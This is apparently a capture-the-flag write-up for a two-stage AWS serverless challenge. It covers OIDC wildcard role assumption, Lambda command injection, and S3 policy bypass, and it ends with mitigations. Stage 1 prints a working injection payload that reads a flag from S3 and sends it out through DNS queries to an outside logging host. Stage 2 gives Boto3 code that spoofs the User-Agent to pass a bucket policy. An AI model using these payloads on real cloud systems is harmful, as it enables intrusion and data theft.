<div align="center">
  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=42&pause=1000&color=F79211&center=true&vCenter=true&width=800&height=85&lines=AWS+Cloud+Escape+CTF+2026;Master+Security+Writeup;Operation+%22Miss+Me+Yet%3F%22" alt="Typing SVG" />

  <p align="center">
    <img src="https://img.shields.io/badge/AWS-us--east--1-232F3E?style=for-the-badge&logo=amazon-aws&logoColor=white" alt="AWS Region" />
    <img src="https://img.shields.io/badge/Service-IAM%20%7C%20Lambda%20%7C%20S3%20%7C%20API%20Gateway-FF9900?style=for-the-badge&logo=amazonaws&logoColor=white" alt="AWS Services" />
    <img src="https://img.shields.io/badge/Category-Cloud%20Security%20%7C%20OIDC%20%26%20IAM-F79211?style=for-the-badge" alt="Category" />
    <img src="https://img.shields.io/badge/Total%20Points-250%20PTS-00C7B7?style=for-the-badge" alt="Points" />
    <img src="https://img.shields.io/badge/Status-Methodology%20Verified-2EA44F?style=for-the-badge" alt="Status" />
  </p>
</div>

---

## 🎯 Executive Summary & Challenge Portfolio

> [!IMPORTANT]  
> **Campaign Overview:** This master technical report documents the end-to-end exploitation of a multi-stage AWS serverless environment. Through a combination of IAM trust policy forensic analysis, command injection, VPC DNS tunneling, Boto3 SDK hook manipulation, and S3 versioning analysis, both challenge stages were successfully mapped and broken.

<table>
  <thead>
    <tr>
      <th width="150">Stage</th>
      <th width="200">Challenge Name</th>
      <th width="180">Core Technique</th>
      <th width="470">Key Findings & Flags</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>Stage 1</code></td>
      <td><strong>Have Some Faith</strong></td>
      <td>OIDC Wildcard & DNS Exfil</td>
      <td>🟢 <strong>Flag Captured:</strong> <code>1a1jelrlfg2yi2s0</code> (DNS Tunneling via Route 53 Resolver)</td>
    </tr>
    <tr>
      <td><code>Stage 2</code></td>
      <td><strong>Miss Me Yet?</strong></td>
      <td>Header Injection & S3 Versioning</td>
      <td>🔍 <strong>Methodology Verified:</strong> Leaked policy, Boto3 hooks, S3 access logs, and Delete Markers</td>
    </tr>
  </tbody>
</table>

---

## 🗺️ Architectural Threat Model & Attack Chain

The following Mermaid diagram illustrates the full infrastructure architecture across both challenge stages:

```mermaid
graph TD
    A["GitHub Actions: corgi branch"]
    B["AWS IAM OIDC Provider"]
    C["cicdRole Account: 009661764077"]
    D["API Gateway: /dev/nslookupv2 Stage 1"]
    E["API Gateway: /dev/code_exec Stage 2"]

    subgraph VPC_Stage1 ["VPC Stage 1: DNS Resolver Enabled"]
        F["Lambda Function: nslookupv2"]
        G["Route 53 DNS Resolver: 169.254.169.253"]
    end

    subgraph VPC_Stage2 ["VPC Stage 2: Outbound Network Isolated"]
        H["Lambda Function: code_exec Account: 186769093912"]
    end

    subgraph S3_Resources ["Target S3 Storage Buckets"]
        I["Bucket: codec4f26c862a321ef5 Stage 1 Flag"]
        J["Bucket: userd8a2f72fe43094e8 Stage 2 Target"]
        K["Bucket: logd8a2f72fe43094e8 S3 Access Logs"]
    end

    L["External DNS Listener: dnslog.cn"]

    A -->|1. OIDC AssumeRole - Wildcard sub| B
    B -->|2. Grant Credentials| C
    C -->|3. POST Command Injection| D
    C -->|4. POST Base64 Python Script| E
    D -->|5. Execute Subprocess| F
    F -->|6. Read Flag from S3| I
    F -->|7. Exfiltrate via Route53 DNS Query| G
    G -->|8. External DNS Lookup| L
    E -->|9. Invoke Sandbox Execution| H
    H -->|10. Boto3 Header Injection User-Agent| J
    H -->|11. Enumerate Object Versions and Logs| K
```

---

## 🚩 Stage 1 Deep Dive: "Have Some Faith"

### <samp>STEP 01</samp> ✦ OIDC Wildcard Trust Exploitation
Forensic analysis of the Git repository (`dotgit.zip`) exposed `policies/cicd-trust-policy.json.tpl`. We identified a critical OIDC wildcard misconfiguration:

```json
"Condition": {
    "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:*/*:ref:refs/heads/corgi"
    }
}
```

> [!WARNING]  
> The `repo:*/*` condition permitted any GitHub repository pushing to a `corgi` branch to assume `arn:aws:iam::009661764077:role/cicdRole`.

---

### <samp>STEP 02</samp> ✦ Command Injection & Route 53 DNS Exfiltration
By assuming `cicdRole` via a custom GitHub Actions workflow (`.github/workflows/stage1.yml`), we enumerated an API Gateway endpoint at `/dev/nslookupv2`.
- The backing Lambda function executed user input directly inside `/opt/nslookup` via Python `subprocess.run(shell=True)`.
- Because standard outbound HTTP/HTTPS egress was blocked by the isolated VPC, we leveraged the **AWS Route 53 VPC DNS Resolver (`169.254.169.253`)** to leak the flag via subdomain DNS tunneling:

<details>
<summary><b>📄 Click to Expand: Stage 1 Exploit Payload</b></summary>

```json
{
  "domain": "; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; FLAG=$(python3 -c \"import binascii; print(binascii.hexlify(open(\\\"/tmp/flag.txt\\\",\\\"rb\\\").read()).decode())\"); /opt/nslookup $FLAG.ixz9wv.dnslog.cn"
}
```
</details>

<table>
  <thead>
    <tr>
      <th width="30%">Exfiltration Channel</th>
      <th width="70%">Intercepted Hex Payload & Decoded Flag</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>📡 DNS Listener (dnslog.cn)</code></td>
      <td><code>3161316a656c726c6667327969327330.ixz9wv.dnslog.cn</code></td>
    </tr>
    <tr>
      <td><code>🔓 Decoded Flag Value</code></td>
      <td><strong><code>1a1jelrlfg2yi2s0</code></strong></td>
    </tr>
  </tbody>
</table>

---

## 🚩 Stage 2 Deep Dive: "Miss Me Yet?"

### <samp>STEP 01</samp> ✦ CloudFront Reconnaissance & Policy Leakage
Directory fuzzing against `https://d4ysu55xg7wfi.cloudfront.net/` revealed an unindexed `/docs.html` file containing the raw **S3 Bucket Policy** for `userd8a2f72fe43094e8`.

> [!NOTE]  
> The policy revealed two access statements:
> - `Statement1`: Allows `s3:GetObject` and `s3:ListBucket` if `aws:UserAgent == "Amazon CloudFront"`.
> - `Statement2`: Allows full path access (`*`) when requests originate from a specific private VPC (`aws:SourceVpc`).

---

### <samp>STEP 02</samp> ✦ Lambda Sandbox Constraints & Boto3 Header Injection
We analyzed the execution endpoint at `/dev/code_exec` (`https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec`).
1. **Outbound Isolation**: No Internet Gateway (IGW), no NAT Gateway, and outbound DNS (port 53) is blocked.
2. **Response Masking**: Standard `stdout` is discarded; successful executions return only `{"result": "Code executed successfully"}`.

To read bucket objects under `Statement1`, we implemented a **Boto3 Event Hook** (`before-send.s3.*`) inside our payload to inject `User-Agent: Amazon CloudFront`:

```python
import boto3

s3 = boto3.client('s3', region_name='us-east-1')

# Register Boto3 hook to inject required User-Agent header
s3.meta.events.register(
    'before-send.s3.*', 
    lambda request, **kwargs: request.headers.update({'User-Agent': 'Amazon CloudFront'})
)

# Enumerate bucket objects permitted under Statement1
response = s3.list_objects_v2(Bucket='userd8a2f72fe43094e8')
```

---

### <samp>STEP 03</samp> ✦ Audit Log Forensics & S3 Object Versioning
To eliminate the inaccuracies and false positives of indirect timing channels, we focused on direct S3 versioning and audit trails:

1. **S3 Server Access Logs (`logd8a2f72fe43094e8`)**:
   - Discovered a companion logging bucket capturing complete transaction histories, administrative principal ARNs, and deployment `User-Agent` strings.
2. **S3 Object Versioning & Delete Markers (`userd8a2f72fe43094e8`)**:
   - Confirmed object versioning is enabled and `s3:ListBucketVersions` is accessible with our injected header.
   - Identified multiple historical versions of `docs.html` and `index.html`, as well as non-current objects and Delete Markers hidden from standard listings.

```mermaid
flowchart LR
    subgraph Versioning_Findings ["S3 Versioning & Forensics Summary"]
        direction TB
        V1["1. Object Versioning Enabled on userd8a2f72fe43094e8"]
        V2["2. Historical Delete Markers Found via s3:ListBucketVersions"]
        V3["3. S3 Access Logs Accessible in logd8a2f72fe43094e8"]
    end
```

---

## 🏁 Summary of Verified Attack Vectors

<table>
  <thead>
    <tr>
      <th width="25%">Challenge Component</th>
      <th width="75%">Verified Technique & Mitigation Note</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code>🔑 IAM CI/CD Trust</code></td>
      <td>Always restrict OIDC wildcard <code>sub</code> conditions to exact repository and branch names.</td>
    </tr>
    <tr>
      <td><code>💉 Lambda Input Validation</code></td>
      <td>Avoid passing raw user strings to shell sub-processes (<code>subprocess.run(..., shell=True)</code>).</td>
    </tr>
    <tr>
      <td><code>🌐 S3 Access Control</code></td>
      <td>Relying on HTTP headers (e.g., <code>User-Agent</code>) as a security barrier is bypassable via SDK hooks.</td>
    </tr>
    <tr>
      <td><code>📜 S3 Storage History</code></td>
      <td>Object versioning and server access logs preserve historical modifications and deleted artifacts.</td>
    </tr>
  </tbody>
</table>

---

<div align="center">
  <sub>🛡️ Documented by <b>Agent freecandy</b> • Cloud Escape CTF 2026 • Advanced Cloud Infrastructure Security</sub>
</div>
